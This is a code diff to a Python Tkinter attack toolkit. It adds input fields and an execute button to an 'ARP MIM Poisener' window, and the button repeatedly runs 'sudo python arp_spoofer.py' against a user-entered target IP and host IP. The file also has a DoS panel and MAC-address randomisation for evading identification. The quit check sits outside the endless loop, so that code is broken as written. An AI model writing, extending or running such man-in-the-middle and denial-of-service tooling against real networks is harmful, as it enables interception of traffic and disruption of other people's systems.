@@ -8,6 +8,7 @@ import scapy as scap
 from scapy.all import *
 from scapy.contrib.eigrp import *
 from scapy.all import sendp
+import keyboard
 
 class dossing_panel(tk.Toplevel):
     def __init__(self, parent):
@@ -194,7 +195,7 @@ class MIM_ARP_Poisener(tk.Toplevel):
     def __init__(self, parent):
         super().__init__(parent)
 
-        self.geometry('300x300')
+        self.geometry('300x250')
         self.title('ARP MIM Poisener/Attack')
 
         def randomise_mac_linux():
@@ -202,6 +203,17 @@ class MIM_ARP_Poisener(tk.Toplevel):
 
         def randomise_mac_win():
             operating_system.system('python randomise_mac_windows.py -r')
+
+        def run_poisiner_linux():
+            tar_ip = tar_ip_inp.get(1.0, "end-1c")
+            hst_ip = tar_host_inp.get(1.0, "end-1c")
+
+            running = True
+
+            while running == True:
+                operating_system.system('sudo python arp_spoofer.py ' + tar_ip + ' ' + hst_ip)
+            if keyboard.is_pressed('ctrl+q'):
+                quit_program()
 
         def quit_program():
             os = plat.system()
@@ -216,9 +228,38 @@ class MIM_ARP_Poisener(tk.Toplevel):
             self.destroy()
 
             print("Quitting Now")
+        
+        def help():
+            operating_system.system('sudo python arp_spoofer.py -h')
 
-        tk.Label(self, text='ARP MIM Poisener/Attack').pack(expand=True)
-        tk.ttk.Button(self, text="Close (USE IT)", command=quit_program).pack(expand=True)
+        title = tk.Label(self, text='ARP MIM Poisener/Attack')
+        title.pack()
+
+        text = Label(self, text="TARGET IP")
+        text.pack(pady=5)
+
+        # TextBox For TARGET
+        tar_ip_inp = Text(self, height = 1, width = 20)
+        tar_ip_inp.pack()
+
+        text = Label(self, text="HOST IP")
+        text.pack(pady=5)
+
+        # TextBox For HOST
+        tar_host_inp = Text(self, height = 1, width = 20)
+        tar_host_inp.pack(pady=5)
+
+        _excecute = tk.ttk.Button(self, text="EXCECUTE", command=run_poisiner_linux)
+        _excecute.pack(pady=5)
+
+        _help = tk.ttk.Button(self, text="HELP", command=help)
+        _help.pack(pady=5)
+        
+        _close = tk.ttk.Button(self, text="Close (USE IT)", command=quit_program)
+        _close.pack(pady=5)
+
+        
+
 
 class master(tk.Tk):
     def __init__(self):
